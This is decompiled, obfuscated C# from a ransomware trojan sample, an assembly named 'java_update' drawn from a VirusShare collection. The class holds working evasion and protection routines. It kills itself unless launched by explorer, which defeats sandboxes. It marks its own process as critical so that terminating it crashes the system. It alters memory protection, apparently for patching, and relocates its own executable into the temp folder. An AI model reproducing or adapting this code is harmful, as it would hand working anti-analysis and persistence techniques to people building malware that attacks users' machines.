// Decompiled with JetBrains decompiler
// Type: ᏬĴவߙւ̞ᙘ.Ṩჩၡ᧦ఱᜰᇻപṅᤜ
// Assembly: java_update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 557F7238-B13A-4798-94BE-2CA1CC027032
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-501fe6aaa92a5c9bad3bf6a1cdf6d5d77d5236bad8aca53c2ce66f490a365092.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace ᏬĴவߙւ̞ᙘ
{
  public static class Ṩჩၡ\u19E6ఱᜰᇻപṅᤜ
  {
    public static void \u0A53ிᣆ\u0CDC\u0040ዻঔ\u0FC3()
    {
      if (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.ڣᝧ᱉Қݾ၂֠\u1ACEᕎڨˊᦈࢡᮏᘐᦙ)
        Ṩჩၡ\u19E6ఱᜰᇻപṅᤜ.ᮓᴥ\u135Bཤ᱆ᗗ\u0F33ͣᔮ\u0A7Eᯯዚᢈ\u0ADFӾᐙ\u0BFF();
      if (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u05ADᄠ\u05EC\u18ADኊᄜᔵݗϭᇭԢ\u0B11ᴠࡄጧ && !Ṩჩၡ\u19E6ఱᜰᇻപṅᤜ.\u1AF1ᢲᔓɧ\u003Dൗӓثᇭܡᢥ)
        Process.GetCurrentProcess().Kill();
      if (!ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.Ҙᖯᚪዜ\u19FBཀྵଷ൧ˇ\u09F2ḁ\u0A3Aᶜ\u0F06Ԗ\u0017)
        return;
      Ṩჩၡ\u19E6ఱᜰᇻപṅᤜ.ޞਚᡦᥧᮯජ();
    }

    public static void ᮓᴥ\u135Bཤ᱆ᗗ\u0F33ͣᔮ\u0A7Eᯯዚᢈ\u0ADFӾᐙ\u0BFF()
    {
      try
      {
        IntPtr num = ᓡ\u058Bᗞ\u0001֥ᏻᆬĕᄲᮐ\u008Dᔁ\u1BFC\u12B7.ੴ\u0488ᗔ\u02FCဵᯒᷲÅ̹((string) null);
        ᓡ\u058Bᗞ\u0001֥ᏻᆬĕᄲᮐ\u008Dᔁ\u1BFC\u12B7.\u1069؀ы\u0866ᅩŐᚅ\u0FE2ᩆᶶïἥᒍፈᴀ\u1CB4(num, 512U, 4U, out uint _);
        ᓡ\u058Bᗞ\u0001֥ᏻᆬĕᄲᮐ\u008Dᔁ\u1BFC\u12B7.ᠯ៎ᛧ9ᓗᩔ൯؂ౕἔᤉᱠᄅ\u0CF8\u0B74૦ᩏᖴ(num, (IntPtr) 512);
      }
      catch
      {
      }
    }

    public static void ޞਚᡦᥧᮯජ()
    {
      try
      {
        int ͳंᱛ๊ᠨًᓉڟ؅ࠍ = 1;
        ᓡ\u058Bᗞ\u0001֥ᏻᆬĕᄲᮐ\u008Dᔁ\u1BFC\u12B7.\u0BE4ᥘṍݲᅍᢙ(Process.GetCurrentProcess().Handle, 29, ref ͳंᱛ๊ᠨًᓉڟ؅ࠍ, 4);
      }
      catch
      {
      }
    }

    public static bool \u1AF1ᢲᔓɧ\u003Dൗӓثᇭܡᢥ
    {
      get
      {
        using (ManagementObject managementObject = new ManagementObject("win32_process.handle='" + Process.GetCurrentProcess().Id.ToString() + "'"))
        {
          managementObject.Get();
          return !(Process.GetProcessById(Convert.ToInt32(managementObject["ParentProcessId"])).ProcessName.ToLower() != "explorer");
        }
      }
    }

    public static void \u1CE0\u058A߈\u0ABBᛌ\u0DBFޥΠࢫക()
    {
      try
      {
        string tempFileName = Path.GetTempFileName();
        File.Delete(tempFileName);
        string destFileName = tempFileName.Replace(".tmp", ".exe");
        File.Move(Process.GetCurrentProcess().MainModule.FileName, destFileName);
      }
      catch
      {
      }
    }
  }
}
